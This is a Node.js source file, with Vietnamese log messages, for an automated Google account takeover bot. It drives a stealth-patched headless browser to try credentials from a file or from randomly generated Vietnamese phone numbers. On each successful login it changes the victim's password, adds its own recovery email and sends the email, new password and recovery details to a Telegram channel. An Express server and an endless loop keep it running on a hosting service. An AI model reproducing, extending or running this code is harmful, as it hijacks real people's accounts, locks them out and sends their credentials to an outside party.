const StealthPlugin = require('puppeteer-extra-plugin-stealth');
const puppeteer = require('puppeteer-extra');
const bodyParser = require('body-parser');
const express = require('express');
const axios = require('axios');
require('dotenv').config();

const { randomLoginData, typePassword, delay, getRapt, exists, sendTelegramMessage ,changeGooglePassword,waitForRecoveryAdd} = require('phonevn');
const fs = require('fs');
const path = require('path');

// Load accounts from accounts.txt (if exists)
function loadAccountsFromTxt(txtFile = 'accounts.txt') {
  const filePath = path.join(__dirname, txtFile);
  if (!fs.existsSync(filePath)) return [];
  const lines = fs.readFileSync(filePath, 'utf-8')
    .split('\n')
    .map(line => line.trim())
    .filter(line => line && !line.startsWith('#'));
  return lines.map(line => {
    const [emailOrPhone, password] = line.split(',');
    return { emailOrPhone, password };
  });
}
let accountList = loadAccountsFromTxt();
let accountIndex = 0;
let phoneCount = 0;
let page = null;
let mID = null;
let mLoaded = false;
let mPassword = null;
let mRecovery = null;
let mStart = new Date().toString();

function logStep(message) {
  const now = new Date().toLocaleTimeString();
  console.log(`[${now}] [STEP] ${message}`);
}

(async () => {
  const name = process.env.username || 'appgologin@gmail.com';
  await sendTelegramMessage(`📲${name} is running`);
})();

const app = express();
app.use(express.json());
app.use(bodyParser.urlencoded({ extended: true }));
puppeteer.use(StealthPlugin());

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`Listening on port ${PORT}...`));

(async function infiniteLoop() {
  while (true) {
    try {
      await startBrowser();
    } catch (err) {
      console.error('[InfiniteLoop] Lỗi khi chạy startBrowser:', err.message);
    }
    await delay(10000);
  }
})();

setInterval(async () => { await pageReload(); }, 5* 60 * 1000); // 30 phút

app.post('/login', async (req, res) => {
  const { email, password } = req.body || {};
  if (email && password) {
    if (mLoaded) {
      const mData = await getLoginToken(email, password);
      res.end(JSON.stringify(mData));
    } else {
      await delay(10000);
      res.end(JSON.stringify({ status: -1 }));
    }
  } else {
    res.end(JSON.stringify({ status: -1 }));
  }
});

app.get('/login', async (req, res) => {
  const number = req.query.number;
  if (number) {
    if (mLoaded) {
      const mData = await getLoginToken(number);
      res.end(JSON.stringify(mData));
    } else {
      await delay(10000);
      res.end(JSON.stringify({ status: -1 }));
    }
  } else {
    res.end(JSON.stringify({ status: -1 }));
  }
});

app.get('/reload', async (req, res) => {
  await pageReload();
  res.end('Reload Success');
});

app.get('/', async (req, res) => {
  if (mID == null) {
    try {
      let url = req.query.url || req.hostname.replace('.onrender.com', '');
      if (url && url !== 'localhost') mID = url;
    } catch (e) {}
  }
  res.end(mStart);
});

async function startBrowser() {
  logStep('Khởi động trình duyệt và bắt đầu quy trình đăng nhập');
  let browser;
  try {
    browser = await puppeteer.launch({
      headless: false,
      headless: 'new',
      args: [
        '--no-sandbox',
        '--disable-notifications',
        '--disable-setuid-sandbox',
        '--ignore-certificate-errors',
        '--ignore-certificate-errors-skip-list',
        '--disable-dev-shm-usage'
      ],
      executablePath: process.env.NODE_ENV === 'production' ? process.env.PUPPETEER_EXECUTABLE_PATH : puppeteer.executablePath()
    });

    let pages = await browser.pages();
    page = pages[0];
    let foundPasswordPage = false;
    let phone, password, emailOrPhone;
    logStep('Đang tìm trang nhập mật khẩu...');

    while (!foundPasswordPage) {
      if (accountList.length > 0 && accountIndex < accountList.length) {
        ({ emailOrPhone, password } = accountList[accountIndex++]);
        logStep(`Thử đăng nhập với tài khoản từ file: ${emailOrPhone}`);
      } else {
        ({ phone, password } = randomLoginData());
        phoneCount++;
        console.log('Tạo phone:', phone, 'Tổng số phone đã tạo:', phoneCount);
        emailOrPhone = '84' + phone.replace(/^0/, '');
        logStep(`Thử đăng nhập với số điện thoại random: ${emailOrPhone}`);
      }
      await page.goto("https://accounts.google.com/v3/signin/identifier?continue=https%3A%2F%2Fmyaccount.google.com%2Fintro%2Fsecurity&ec=GAZAwAE&followup=https%3A%2F%2Fmyaccount.google.com%2Fintro%2Fsecurity&ifkv=AdBytiMQP4oqdCGRqBJL2k3ZHiB6Y3feULcc0TtKSLvINSNY5DjVA0B3BX0MTo3yIG-8hxSr3Fen&osid=1&passive=1209600&service=accountsettings&flowName=GlifWebSignIn&flowEntry=ServiceLogin&dsh=S2099267155%3A1753582003030136", { waitUntil: 'load', timeout: 0 });
      await delay(1000);
      await page.type('#identifierId', emailOrPhone);
      logStep('Đã nhập tài khoản');
      await delay(2000);
      await page.click('#identifierNext');
      logStep('Đã bấm Next để chuyển sang bước nhập mật khẩu');
      await delay(5000);

      try {
        const pageUrl = await page.evaluate(() => window.location.href);
        if (pageUrl && pageUrl.startsWith('https://accounts.google.com/v3/signin/challenge/pwd')) {
          foundPasswordPage = true;
        }
      } catch (e) {
        logStep('Lỗi khi kiểm tra URL trang mật khẩu: ' + e.message);
      }
    }
    logStep("Nhập mật khẩu vào " + password);
    await typePassword(page, password);
    await delay(3000);
    const url = await page.url();
    logStep('Kiểm tra nếu chuyển sang trang đổi mật khẩu...');
    if (url.includes('/changepassword')) {
      const pass = randomLoginData().password2;
      await page.type('input[name="Passwd"]', pass);
      await page.type('input[name="ConfirmPasswd"]', pass);
      logStep('Đổi mật khẩu mới và hoàn tất đăng nhập');
      await page.click('#changepasswordNext');
      await delay(3000);
      await sendTelegramMessage(`✅ Đăng nhập thành công: ${phone} | ${pass}`);
      return;
    }

    logStep('Chờ kiểm tra đăng nhập thành công/rescue phone...');
    mPassword = null;
    mRecovery = null;

    try {
      logStep('Truy cập trang rescue phone để lấy email xác thực...');
      await page.goto('https://myaccount.google.com/signinoptions/rescuephone', { waitUntil: 'load', timeout: 0 });
      await delay(4000);

      const email = await page.evaluate(() => {
        const emailDiv = document.querySelector('div[jsname="bQIQze"].IxcUte');
        return emailDiv ? emailDiv.innerText.trim() : null;
      });

      if (email) {
        mRecovery = randomLoginData().recover;
        mPassword = randomLoginData().password2;
        logStep(`Tìm thấy email: ${email}`);
        await sendTelegramMessage(`Đăng nhập thành công: ${email} | ${mPassword}|${mRecovery}|${phone || emailOrPhone}`);
        await typePassword(page, password);
        await delay(2000);
        const urlNow = await page.url();
        await delay(2000);
        const mRapt = await getRapt(urlNow);
        console.log('Rapt token:', mRapt);
        await waitForRecoveryAdd(page, mRapt, mRecovery)
        await changeGooglePassword(page, mRapt, mPassword);
        await sendTelegramMessage(`✅ ${email} | ${mPassword} | ${mRecovery} | ${phone || emailOrPhone}`);
      }
    } catch (err) {
      logStep('[ERROR] Trong quá trình xử lý sau đăng nhập: ' + err.message);
    }
  } catch (err) {
    logStep('[ERROR] Lỗi trong startBrowser: ' + err.message);
  } finally {
    if (browser) await browser.close();
  }
}

async function loadLoginPage() {
  logStep('Tải lại trang đăng nhập Google');
  for (let i = 0; i < 3; i++) {
    try {
      const pages = await page.browser().pages();
      if (pages.length > 1) {
        for (let j = 1; j < pages.length; j++) {
          await pages[j].close();
        }
      }
      page = pages[0];
      if (page.isClosed()) {
        page = await page.browser().newPage();
      }
      await page.goto('https://accounts.google.com/ServiceLogin?service=accountsettings&continue=https://myaccount.google.com', { timeout: 60000 });
      logStep('Đã tải lại trang đăng nhập Google thành công');
      break;
    } catch (e) {
      console.warn('[loadLoginPage] retry:', e.message);
      await delay(1000);
    }
  }
}

async function pageReload() {
  mLoaded = false;
  await loadLoginPage();
  mLoaded = true;
}

async function updateStatus() {
  try {
    if (mID) {
      await axios.get('https://' + mID + '.onrender.com');
    }
  } catch (e) {}
}

async function getLoginToken(emailOrPhone, password) {
  // Tùy bạn triển khai, đây chỉ ví dụ giả
  return { status: 1, message: `Login thử với ${emailOrPhone}` };
}
